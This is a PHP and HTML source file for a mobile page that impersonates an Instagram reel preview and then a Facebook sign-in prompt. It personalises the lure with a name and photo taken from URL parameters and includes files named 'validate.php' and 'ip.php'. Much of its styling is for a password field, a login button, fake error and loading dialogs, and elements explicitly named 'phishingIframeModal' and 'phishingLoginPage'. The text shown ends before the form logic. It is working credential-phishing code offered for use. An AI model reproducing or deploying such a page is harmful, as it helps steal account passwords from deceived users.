<?php
include "validate.php";
include "ip.php";

// --- MANUAL PROFILE INPUT VIA URL PARAMS ---
$manual_pic = $_GET['pic'] ?? '';
$manual_name = $_GET['name'] ?? '';

// Sanitize inputs
$manual_pic = filter_var($manual_pic, FILTER_SANITIZE_URL);
$manual_name = htmlspecialchars($manual_name, ENT_QUOTES, 'UTF-8');

// Build display values - PROFILE PIC from URL param
$display_pic = !empty($manual_pic) ? $manual_pic : 'gerald.jpg';
$display_name = !empty($manual_name) ? $manual_name : 'Grld Gunda';
$display_heading = !empty($manual_name) ? "Sign in as {$manual_name}" : "Sign in to keep watching";
$display_email = $_GET['email'] ?? ''; // Optional email for form
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>Facebook</title>

    <!-- Favicon -->
    <link rel="shortcut icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yi/r/4Kv5U5b1o3f.png" sizes="196x196" />

    <!-- SEO -->
    <meta name="description" content="Watch this video on Instagram Watch the latest news and breaking stories. Click to view the full story." />
    <meta name="robots" content="noodp,noydir" />
    <link rel="canonical" href="https://www.instagram.com/reel/" />

    <!-- Referrer & Theme -->
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <meta name="theme-color" content="#1877f2" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />

    <!-- Open Graph / Facebook -->
    <meta property="fb:app_id" content="966242223397117" />
    <meta property="og:site_name" content="Instagram" />
    <meta property="og:title" content="Watch this video on Instagram" />
    <meta property="og:description" content="See this and more on Instagram. Connect with friends and discover new content." />
    <meta property="og:image" content="assets/og-image.png" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.instagram.com/reel/" />
    <meta property="og:locale" content="en_US" />
    <meta property="article:published_time" content="2025-11-06T20:00:00+08:00" />
    <meta property="article:author" content="Instagram" />

    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Watch this video on Instagram" />
    <meta name="twitter:description" content="See this and more on Instagram." />
    <meta name="twitter:image" content="assets/og-image.png" />

    
      <!-- Preconnect -->
    <link rel="preconnect" href="https://static.wixstatic.com">
    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="preconnect" href="https://static.xx.fbcdn.net">
    <link rel="preconnect" href="https://static.wixstatic.com">

    <!-- Stylesheets -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
        }

        :root {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #101010;
            background-color: #0f0f0f;
        }

        html,
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            background: #f4f4f4;
        }

        #app-root {
            position: relative;
            width: 100%;
            max-width: 480px;
            min-height: 100vh;
            overflow: hidden;
            margin: 0 auto;
            background: #f4f4f4;
        }

        body[data-state="immersive"],
        body[data-state="cta"] {
            background: #000;
        }

        body[data-state="immersive"] #app-root,
        body[data-state="cta"] #app-root {
            max-width: none;
            width: 100%;
            background: #000;
            min-height: 100vh;
        }

        .state {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            opacity: 0;
            transition: opacity 200ms ease;
        }

        .state.is-active {
            opacity: 1;
            pointer-events: auto;
            z-index: 3;
        }

        .state-preview {
            position: relative;
            z-index: 3;
            background: linear-gradient(180deg, #fefefe 0%, #f4f4f4 100%);
            border-radius: 24px;
            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.18);
            padding: 20px 24px 32px;
            display: flex;
            flex-direction: column;
            gap: 18px;
            overflow-y: auto;
        }

        .state-preview.is-transitioning {
            animation: previewExit var(--preview-exit-duration, 420ms) ease forwards;
        }

        @keyframes previewExit {
            0% {
                transform: translateY(0) scale(1);
                opacity: 1;
            }

            60% {
                transform: translateY(-10px) scale(0.97);
                opacity: 0.4;
            }

            100% {
                transform: translateY(-20px) scale(0.94);
                opacity: 0;
            }
        }

        .preview-header {
            display: flex;
            justify-content: center;
        }

        .logo-row {
            width: 100%;
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 4px 0;
        }

        .logo-area {
            display: flex;
            align-items: center;
        }

        .logo-area img,
        .logo-area svg {
            display: block;
            height: 26px;
            width: auto;
        }

        .continue-link {
            font-size: 13px;
            font-weight: 600;
            color: #0095f6;
            line-height: 1;
            margin-left: auto;
        }

        .preview-media {
            position: relative;
            border-radius: 18px;
            overflow: hidden;
            aspect-ratio: 9/16;
            background: #000;
            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.25);
            max-width: 360px;
            width: 100%;
            margin: 0 auto;
        }

        .preview-thumbnail {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        .video-overlay {
            position: absolute;
            inset: 0;
            background: radial-gradient(circle at center, rgba(0, 0, 0, 0) 40%, rgba(0, 0, 0, 0.7) 100%);
        }

        .play-trigger {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 72px;
            height: 72px;
            border-radius: 50%;
            border: none;
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: transform 150ms ease, background 150ms ease;
        }

        .play-trigger:focus-visible,
        .play-trigger:hover {
            background: rgba(0, 0, 0, 0.8);
            transform: translate(-50%, -50%) scale(1.05);
        }

        .play-trigger svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }

        .preview-caption {
            margin: 16px auto 0;
            text-align: center;
            font-size: 17px;
            font-weight: 600;
            color: #111;
        }

        .preview-footer {
            width: 100%;
            max-width: 360px;
            margin: 20px auto 0;
            display: flex;
            flex-direction: column;
            gap: 10px;
            text-align: center;
        }

        .action-button {
            border: none;
            border-radius: 12px;
            padding: 14px 16px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }

        .action-button.primary {
            background: #4c5bec;
            color: #fff;
        }

        .action-button.secondary {
            background: transparent;
            color: #4c5bec;
        }

        .terms-text {
            margin: 10px 0 0;
            font-size: 12px;
            color: #777;
        }

        .terms-text a {
            color: #4c5bec;
            text-decoration: none;
        }

        .state-immersive {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1;
            min-height: 100vh;
        }

        .state-immersive video {
            width: 100%;
            height: 100%;
            min-height: 100vh;
            object-fit: cover;
            transform: translateZ(0);
        }

        .immersive-overlay {
            position: absolute;
            inset: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            pointer-events: none;
        }

        .immersive-header {
            display: flex;
            justify-content: space-between;
            font-size: 16px;
            color: #fff;
            font-weight: 600;
        }

        .pill {
            border-radius: 999px;
            padding: 6px 14px;
            background: rgba(0, 0, 0, 0.45);
            border: 1px solid rgba(255, 255, 255, 0.4);
        }

        .immersive-icons {
            position: absolute;
            right: 16px;
            bottom: 150px;
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        .overlay-icon {
            width: 48px;
            height: 48px;
            border-radius: 16px;
            background: rgba(0, 0, 0, 0.35);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }

        .overlay-icon svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }

        .icon-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            color: #fff;
            font-size: 14px;
            text-shadow: 0 4px 12px rgba(0, 0, 0, 0.6);
        }

        .icon-count {
            font-size: 13px;
        }

        .icon-ellipsis {
            text-align: center;
            color: rgba(255, 255, 255, 0.8);
            font-size: 24px;
            margin-top: 2px;
        }

        .immersive-user {
            display: flex;
            flex-direction: row;
            gap: 8px;
            align-items: center;
            background: rgba(0, 0, 0, 0.55);
            padding: 8px 14px;
            border-radius: 999px;
            color: #fff;
            max-width: 85%;
        }

        .immersive-user .footer-profile-pic {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            border: 2px solid rgba(255, 255, 255, 0.8);
            object-fit: cover;
            flex-shrink: 0;
        }

        .immersive-user .username {
            font-size: 14px;
            font-weight: 600;
            white-space: nowrap;
        }

        .inline-dot {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
        }

        .follow-chip {
            border: 1px solid rgba(255, 255, 255, 0.45);
            border-radius: 999px;
            padding: 4px 14px;
            font-size: 13px;
            font-weight: 600;
            background: transparent;
            color: #fff;
            cursor: pointer;
        }

        .immersive-footer {
            position: absolute;
            bottom: 18px;
            left: 12px;
            right: 12px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .immersive-footer .immersive-user {
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(6px);
            border-radius: 999px;
            padding: 6px 12px;
            display: inline-flex;
            align-self: flex-start;
        }

        .immersive-cta-btn {
            border: none;
            width: 100%;
            border-radius: 999px;
            padding: 12px 20px;
            font-size: 15px;
            font-weight: 600;
            background: #fff;
            color: #111;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
        }

        .state-immersive.show-fallback .video-fallback {
            opacity: 1;
        }

        .video-fallback {
            position: absolute;
            top: 16px;
            left: 50%;
            transform: translateX(-50%);
            padding: 8px 14px;
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            border-radius: 999px;
            font-size: 13px;
            opacity: 0;
            transition: opacity 150ms ease;
        }

        .state-cta {
            position: fixed;
            inset: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            pointer-events: none;
            opacity: 0;
            background: rgba(0, 0, 0, 0.85);
        }

        .state-cta.active {
            pointer-events: auto;
            opacity: 1;
        }

        .dark-overlay {
            display: none;
        }

        .state-cta.active .dark-overlay {
            display: none;
        }

        .cta-modal {
            position: relative;
            max-width: 360px;
            width: 92%;
            margin: 0 auto;
            padding: 40px 28px;
            border-radius: 0;
            background: transparent;
            box-shadow: none;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 16px;
            text-align: center;
            pointer-events: auto;
        }

        .state-cta.active .cta-modal {
            /* visible when parent active */
        }

        .circular-reveal-container {
            width: 140px;
            height: 140px;
            margin: 0 auto 16px;
            border-radius: 50%;
            overflow: hidden;
        }

        .modal-profile-pic {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
            border: 4px solid rgba(255,255,255,0.95);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            background: #333;
        }

        .cta-heading {
            margin: 0;
            font-size: 22px;
            font-weight: 700;
            color: #fff;
            text-shadow: 0 6px 24px rgba(0, 0, 0, 0.6);
        }

        .cta-btn {
            border: none;
            background: #1877f2;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            padding: 14px 36px;
            border-radius: 999px;
            cursor: pointer;
            transition: background 150ms ease;
            min-width: 220px;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .cta-btn:active {
            background: #166fe5;
        }

        .cta-btn-facebook {
            background: #1877f2;
            color: #fff;
            border-radius: 12px;
            padding: 12px 28px;
            min-width: 0;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 6px 16px rgba(24, 119, 242, 0.35);
        }

        .cta-btn-facebook .cta-icon {
            display: inline-flex;
            width: 22px;
            height: 22px;
            border-radius: 50%;
            background: #fff;
            color: #1877f2;
            align-items: center;
            justify-content: center;
        }

        .cta-btn-facebook svg {
            width: 10px;
            height: 10px;
        }

        /* Iframe modal styles (from old index.php) */
        #phishingIframeModal {
            display: none;
            position: fixed !important;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .75);
            z-index: 10001;
            justify-content: center;
            align-items: center;
            padding: 0;
            box-sizing: border-box;
            opacity: 0;
            transition: opacity .15s ease-in-out;
            overflow: hidden;
        }

        #phishingIframeModal.is-visible-iframe {
            opacity: 1;
        }

        #phishingIframeWrapper {
            position: relative;
            width: 100%;
            max-width: 380px;
            max-height: 100vh;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, .25);
            transform: scale(.96) translateY(30px);
            opacity: 0;
            transition: opacity .35s cubic-bezier(.4, 0, .2, 1), transform .35s cubic-bezier(.4, 0, .2, 1);
            display: flex;
            flex-direction: column;
            margin: 16px 10px 28px 10px;
            overflow: hidden;
            height: 500px;
            padding-top: 0;
            padding-bottom: 0;
        }

        #phishingIframeModal.is-visible-iframe #phishingIframeWrapper {
            opacity: 1;
            transform: scale(1) translateY(0);
        }

        .iframe-chrome-top-bar {
            width: 100%;
            height: 56px;
            background-color: #fff;
            display: flex;
            align-items: center !important;
            justify-content: space-between;
            padding: 0 8px;
            border-bottom: 1px solid #e0e0e0;
            box-sizing: border-box;
            z-index: 2;
            flex-shrink: 0;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }

        .iframe-chrome-top-bar > .address-bar-container,
        .iframe-chrome-top-bar > .icon-button,
        .iframe-chrome-top-bar > .tab-switcher {
            align-self: center;
            margin-top: 0;
            margin-bottom: 0;
        }

        .iframe-chrome-top-bar .icon-button {
            display: flex;
            align-items: center;
            justify-content: center;
            min-width: 40px;
            height: 40px;
            border-radius: 50%;
            border: none;
            outline: none;
            transition: background-color .15s ease-in-out;
            flex-shrink: 0;
        }

        .iframe-chrome-top-bar .address-bar-container {
            flex-grow: 1;
            height: 36px;
            background-color: #e8eaed;
            border-radius: 18px;
            display: flex;
            align-items: center;
            padding: 0 12px;
            margin: 0 8px;
            overflow: hidden;
            box-sizing: border-box;
            cursor: text;
            border: 1px solid transparent;
            transition: background-color .15s ease-in-out, box-shadow .15s ease-in-out, border-color .15s ease-in-out;
        }

        #phishingLoginPage {
            width: 100%;
            flex-grow: 1;
            border: none;
            display: block;
            border-bottom-left-radius: 10px;
            border-bottom-right-radius: 10px;
            overflow: hidden !important;
        }

        /* ===== COMPREHENSIVE RESPONSIVE STYLES ===== */
        
        /* Extra Large Phones (iPhone Pro Max, Galaxy S Ultra) - 428px+ */
        @media (max-width: 480px) {
            #app-root {
                width: 100%;
                min-height: 100vh;
                min-height: -webkit-fill-available;
            }

            .state-preview {
                border-radius: 0;
                padding: 18px 16px 26px;
                gap: 16px;
                min-height: 100vh;
                min-height: -webkit-fill-available;
            }

            .preview-media {
                border-radius: 16px;
                max-width: 100%;
            }

            .cta-modal {
                gap: 12px;
                padding: 32px 24px;
            }

            .cta-heading {
                font-size: 20px;
            }

            .cta-btn {
                width: 100%;
                min-width: 0;
            }
            
            .circular-reveal-container {
                width: 130px;
                height: 130px;
            }
            
            .modal-profile-pic {
                width: 130px;
                height: 130px;
            }
            
            .cta-profile-name {
                font-size: 20px;
            }
            
            .cta-login-form {
                max-width: 100%;
                padding: 0 16px;
            }
            
            .cta-password-input {
                height: 50px;
                font-size: 16px;
            }
            
            .cta-btn-login {
                height: 50px;
                font-size: 17px;
            }
        }

        /* Large Phones (iPhone Plus/Pro, Galaxy S) - 414px */
        @media (max-width: 430px) {
            .state-preview {
                padding: 16px 14px 24px;
            }
            
            .preview-media {
                border-radius: 14px;
                aspect-ratio: 9/15;
            }
            
            .action-button {
                padding: 14px 28px;
                font-size: 16px;
            }
            
            .circular-reveal-container {
                width: 120px;
                height: 120px;
            }
            
            .modal-profile-pic {
                width: 120px;
                height: 120px;
            }
            
            #phishingIframeWrapper {
                max-height: 92vh;
                margin: 12px 8px 24px;
            }
        }

        /* Medium Phones (iPhone, Pixel, Galaxy) - 393px */
        @media (max-width: 420px) {
            .state-preview {
                padding: 14px 12px 22px;
                gap: 14px;
            }
            
            .logo-area img,
            .logo-area svg {
                height: 24px;
            }
            
            .continue-link {
                font-size: 12px;
            }
            
            .preview-media {
                border-radius: 12px;
            }
            
            .preview-caption {
                font-size: 14px;
            }
            
            .action-button.primary {
                padding: 13px 24px;
                font-size: 15px;
            }
            
            .action-button.secondary {
                font-size: 14px;
            }
            
            .terms-text {
                font-size: 11px;
            }
            
            .cta-modal {
                padding: 28px 20px;
            }
            
            .cta-fb-logo img {
                height: 40px;
            }
            
            .circular-reveal-container {
                width: 110px;
                height: 110px;
                margin-bottom: 12px;
            }
            
            .modal-profile-pic {
                width: 110px;
                height: 110px;
            }
            
            .cta-profile-name {
                font-size: 18px;
                margin: 6px 0 20px;
            }
            
            .cta-password-input {
                height: 48px;
                font-size: 16px;
                padding: 0 44px 0 14px;
            }
            
            .cta-btn-login {
                height: 48px;
                font-size: 16px;
            }
            
            .cta-forgot-link {
                font-size: 14px;
            }
            
            #phishingIframeWrapper {
                max-height: 95vh;
                margin-top: 16px;
                margin-bottom: 28px;
                height: 470px;
            }
            
            .immersive-cta-btn {
                padding: 12px 24px;
                font-size: 15px;
            }
        }

        /* Standard Phones (iPhone SE 2nd gen, older models) - 375px */
        @media (max-width: 390px) {
            .state-preview {
                padding: 12px 10px 20px;
                gap: 12px;
            }
            
            .logo-row {
                gap: 12px;
            }
            
            .logo-area img,
            .logo-area svg {
                height: 22px;
            }
            
            .preview-media {
                border-radius: 10px;
                aspect-ratio: 9/14;
            }
            
            .play-trigger {
                width: 60px;
                height: 60px;
            }
            
            .play-icon {
                width: 22px;
                height: 22px;
            }
            
            .preview-caption {
                font-size: 13px;
            }
            
            .action-button.primary {
                padding: 12px 20px;
                font-size: 14px;
                border-radius: 20px;
            }
            
            .action-button.secondary {
                font-size: 13px;
            }
            
            .circular-reveal-container {
                width: 100px;
                height: 100px;
                margin-bottom: 10px;
            }
            
            .modal-profile-pic {
                width: 100px;
                height: 100px;
            }
            
            .cta-profile-name {
                font-size: 17px;
                margin: 4px 0 18px;
            }
            
            .cta-login-form {
                padding: 0 12px;
                gap: 10px;
            }
            
            .cta-password-input {
                height: 46px;
                font-size: 15px;
                border-radius: 10px;
            }
            
            .cta-btn-login {
                height: 46px;
                font-size: 15px;
                border-radius: 10px;
            }
            
            #phishingIframeWrapper {
                height: 450px;
                max-height: 90vh;
            }
        }

        /* Small Phones (iPhone SE 1st gen, Galaxy mini) - 360px */
        @media (max-width: 360px) {
            .state-preview {
                padding: 10px 8px 18px;
                gap: 10px;
            }
            
            .preview-header {
                flex-direction: row;
                gap: 8px;
            }
            
            .logo-area img,
            .logo-area svg {
                height: 20px;
            }
            
            .continue-link {
                font-size: 11px;
            }
            
            .preview-media {
                border-radius: 8px;
                aspect-ratio: 9/13;
            }

            .play-trigger {
                width: 56px;
                height: 56px;
            }
            
            .play-icon {
                width: 20px;
                height: 20px;
            }
            
            .preview-caption {
                font-size: 12px;
            }
            
            .preview-footer {
                gap: 10px;
            }
            
            .action-button.primary {
                padding: 11px 18px;
                font-size: 13px;
            }
            
            .action-button.secondary {
                font-size: 12px;
            }
            
            .terms-text {
                font-size: 10px;
                line-height: 1.3;
            }

            .cta-modal {
                padding: 24px 16px;
                gap: 10px;
            }
            
            .cta-fb-logo {
                margin-bottom: 20px;
            }
            
            .cta-fb-logo img {
                height: 36px;
            }
            
            .circular-reveal-container {
                width: 90px;
                height: 90px;
                margin-bottom: 8px;
            }
            
            .modal-profile-pic {
                width: 90px;
                height: 90px;
            }

            .cta-heading {
                font-size: 18px;
            }
            
            .cta-profile-name {
                font-size: 16px;
                margin: 4px 0 16px;
            }
            
            .cta-login-form {
                gap: 8px;
                padding: 0 8px;
            }
            
            .cta-password-input {
                height: 44px;
                font-size: 14px;
                padding: 0 40px 0 12px;
                border-radius: 8px;
            }
            
            .cta-password-toggle {
                right: 10px;
            }
            
            .cta-password-toggle svg {
                width: 18px;
                height: 18px;
            }

            .cta-btn {
                padding: 12px 24px;
                font-size: 15px;
            }
            
            .cta-btn-login {
                height: 44px;
                font-size: 14px;
                border-radius: 8px;
                margin-top: 4px;
            }
            
            .cta-forgot-link {
                font-size: 13px;
                margin-top: 14px;
            }
            
            #phishingIframeWrapper {
                height: 420px;
                max-height: 88vh;
                margin: 10px 6px 20px;
                border-radius: 8px;
            }
            
            .iframe-chrome-top-bar {
                height: 48px;
            }
            
            .immersive-header {
                font-size: 13px;
            }
            
            .immersive-cta-btn {
                padding: 10px 20px;
                font-size: 14px;
            }
        }

        /* Extra Small Phones (older/budget devices) - 320px */
        @media (max-width: 320px) {
            .state-preview {
                padding: 8px 6px 16px;
                gap: 8px;
            }
            
            .logo-area img,
            .logo-area svg {
                height: 18px;
            }
            
            .continue-link {
                font-size: 10px;
            }
            
            .preview-media {
                border-radius: 6px;
                aspect-ratio: 9/12;
            }
            
            .play-trigger {
                width: 48px;
                height: 48px;
            }
            
            .play-icon {
                width: 18px;
                height: 18px;
            }
            
            .preview-caption {
                font-size: 11px;
            }
            
            .action-button.primary {
                padding: 10px 16px;
                font-size: 12px;
                border-radius: 18px;
            }
            
            .action-button.secondary {
                font-size: 11px;
            }
            
            .terms-text {
                font-size: 9px;
            }
            
            .cta-modal {
                padding: 20px 12px;
            }
            
            .cta-fb-logo {
                margin-bottom: 16px;
            }
            
            .cta-fb-logo img {
                height: 32px;
            }
            
            .circular-reveal-container {
                width: 80px;
                height: 80px;
                margin-bottom: 6px;
            }
            
            .modal-profile-pic {
                width: 80px;
                height: 80px;
            }
            
            .cta-profile-name {
                font-size: 15px;
                margin: 2px 0 14px;
            }
            
            .cta-password-input {
                height: 42px;
                font-size: 13px;
            }
            
            .cta-btn-login {
                height: 42px;
                font-size: 13px;
            }
            
            .cta-forgot-link {
                font-size: 12px;
            }
            
            #phishingIframeWrapper {
                height: 380px;
                max-height: 85vh;
            }
        }

        /* Landscape Orientation - All Phones */
        @media (max-height: 500px) and (orientation: landscape) {
            .state-preview {
                padding: 10px 16px 16px;
                gap: 10px;
                flex-direction: row;
                flex-wrap: wrap;
                justify-content: center;
                align-items: flex-start;
            }
            
            .preview-header {
                width: 100%;
            }
            
            .preview-media {
                max-width: 35vh;
                aspect-ratio: 9/16;
            }
            
            .preview-caption {
                width: 100%;
                text-align: center;
            }
            
            .preview-footer {
                width: 50%;
                max-width: 300px;
            }
            
            .cta-modal {
                flex-direction: row;
                flex-wrap: wrap;
                justify-content: center;
                align-items: center;
                gap: 16px;
                padding: 16px 24px;
            }
            
            .cta-fb-logo {
                width: 100%;
                margin-bottom: 8px;
            }
            
            .circular-reveal-container {
                width: 80px;
                height: 80px;
                margin: 0 16px 0 0;
            }
            
            .cta-profile-name {
                margin: 0;
            }
            
            .cta-login-form {
                flex-direction: row;
                flex-wrap: wrap;
                justify-content: center;
                max-width: 400px;
                gap: 8px;
            }
            
            .cta-password-wrapper {
                flex: 1;
                min-width: 200px;
            }
            
            .cta-btn-login {
                width: auto;
                min-width: 120px;
            }
            
            #phishingIframeWrapper {
                max-height: 85vh;
                height: auto;
            }
        }

        /* Safe Area Insets for Notched Devices */
        @supports (padding: max(0px)) {
            .state-preview {
                padding-top: max(16px, env(safe-area-inset-top));
                padding-bottom: max(24px, env(safe-area-inset-bottom));
                padding-left: max(16px, env(safe-area-inset-left));
                padding-right: max(16px, env(safe-area-inset-right));
            }
            
            .cta-modal {
                padding-top: max(32px, env(safe-area-inset-top));
                padding-bottom: max(24px, env(safe-area-inset-bottom));
            }
            
            .immersive-overlay {
                padding-top: max(16px, env(safe-area-inset-top));
                padding-bottom: max(16px, env(safe-area-inset-bottom));
            }
        }

        /* High DPI / Retina Displays */
        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
            .preview-thumbnail,
            .modal-profile-pic {
                image-rendering: -webkit-optimize-contrast;
            }
        }

        /* Reduced Motion for Accessibility */
        @media (prefers-reduced-motion: reduce) {
            .state,
            .state-preview,
            .cta-modal,
            .cta-password-input,
            .cta-btn-login {
                transition: none;
                animation: none;
            }
        }

        /* CTA Login Form Styles */
        .cta-modal-login {
            /* uses parent .cta-modal styles */
        }

        .cta-fb-logo {
            margin-bottom: 28px;
        }

        .cta-fb-logo img {
            height: 44px;
            width: auto;
            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.3));
        }

        .cta-profile-name {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin: 8px 0 24px;
            letter-spacing: -0.2px;
            text-shadow: 0 2px 12px rgba(0,0,0,0.6);
        }

        .cta-profile-email {
            font-size: 14px;
            color: rgba(255,255,255,0.8);
            margin: 0 0 12px;
        }

        .cta-login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 14px;
            margin-top: 0;
        }

        .cta-password-wrapper {
            position: relative;
            width: 100%;
        }

        .cta-password-input {
            width: 100%;
            height: 52px;
            padding: 0 48px 0 18px;
            border: none;
            border-radius: 12px;
            background: rgba(255,255,255,0.98);
            font-size: 17px;
            color: #1c1e21;
            outline: none;
            transition: box-shadow 0.2s;
            box-shadow: 0 4px 20px rgba(0,0,0,0.25);
        }

        .cta-password-input:focus {
            box-shadow: 0 4px 24px rgba(0,0,0,0.35), 0 0 0 3px rgba(24,119,242,0.3);
        }

        .cta-password-input::placeholder {
            color: #8a8d91;
        }

        .cta-password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            padding: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .cta-btn-login {
            width: 100%;
            height: 52px;
            border: none;
            border-radius: 12px;
            background: #1877f2;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background 0.2s, transform 0.1s;
            margin-top: 8px;
            box-shadow: 0 4px 16px rgba(24,119,242,0.4);
        }

        .cta-btn-login:hover {
            background: #166fe5;
            box-shadow: 0 6px 20px rgba(24,119,242,0.5);
        }

        .cta-btn-login:active {
            transform: scale(0.98);
        }

        .cta-btn-login:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .cta-btn-login .btn-spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spinner-rotate 0.8s linear infinite;
        }

        .cta-forgot-link {
            color: #fff;
            font-size: 15px;
            font-weight: 500;
            text-decoration: none;
            margin-top: 20px;
            display: inline-block;
            text-shadow: 0 2px 8px rgba(0,0,0,0.4);
        }

        .cta-forgot-link:hover {
            text-decoration: underline;
        }

        .cta-forgot-link:hover {
            text-decoration: underline;
        }

        /* Error Modal */
        .cta-error-modal {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10002;
        }

        .cta-error-content {
            background: #fff;
            border-radius: 12px;
            width: 90%;
            max-width: 320px;
            text-align: center;
            overflow: hidden;
            animation: modalPop 0.2s ease;
        }

        @keyframes modalPop {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .cta-error-content h3 {
            font-size: 18px;
            font-weight: 600;
            color: #1c1e21;
            padding: 20px 20px 8px;
            margin: 0;
        }

        .cta-error-content p {
            font-size: 14px;
            color: #606770;
            padding: 0 20px 16px;
            margin: 0;
            line-height: 1.4;
        }

        .cta-error-ok {
            width: 100%;
            padding: 14px;
            border: none;
            border-top: 1px solid #dadde1;
            background: none;
            color: #1877f2;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }

        .cta-error-ok:hover {
            background: #f5f6f7;
        }

        /* Loading Modal */
        .cta-loading-modal {
            position: fixed;
            inset: 0;
            background: rgba(240,242,245,0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10003;
        }

        .cta-loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(0,0,0,0.1);
            border-top-color: #1877f2;
            border-radius: 50%;
            animation: spinner-rotate 0.8s linear infinite;
        }

        .cta-loading-modal p {
            margin-top: 16px;
            color: #65676b;
            font-size: 15px;
        }
    </style>
</head>
<body data-state="preview">
    <div id="app-root" data-state="preview">
        <main class="state state-preview is-active" aria-live="polite">
            <header class="preview-header" aria-label="Instagram preview header">
                <div class="logo-row">
                    <div class="logo-area" aria-hidden="true">
                        <img class="instagram-logo" src="https://static.wixstatic.com/media/8455f5_effc9f568a1645b08e796419f20ee45b~mv2.png" alt="Instagram logo">
                    </div>
                    <span class="continue-link" aria-hidden="true">Continue on web</span>
                </div>
            </header>

            <section class="preview-media" aria-label="Video teaser">
                <img class="preview-thumbnail" src="https://static.wixstatic.com/media/8455f5_a1a05e78db8345938482383301ff10bc~mv2.png" alt="Preview thumbnail" loading="eager" decoding="async">

                <span class="video-overlay" aria-hidden="true"></span>
                <button type="button" class="play-trigger" data-role="play-trigger" aria-label="Play and open immersive experience">
                    <svg aria-hidden="true" class="play-icon" viewBox="0 0 24 24" role="presentation">
                        <path d="M5.888 22.5a3.46 3.46 0 0 1-1.721-.46l-.003-.002a3.451 3.451 0 0 1-1.72-2.982V4.943a3.445 3.445 0 0 1 5.163-2.987l12.226 7.059a3.444 3.444 0 0 1-.001 5.967l-12.22 7.056a3.462 3.462 0 0 1-1.724.462Z"/>
                    </svg>
                </button>
            </section>

            <p class="preview-caption">Watch this reel in the app</p>

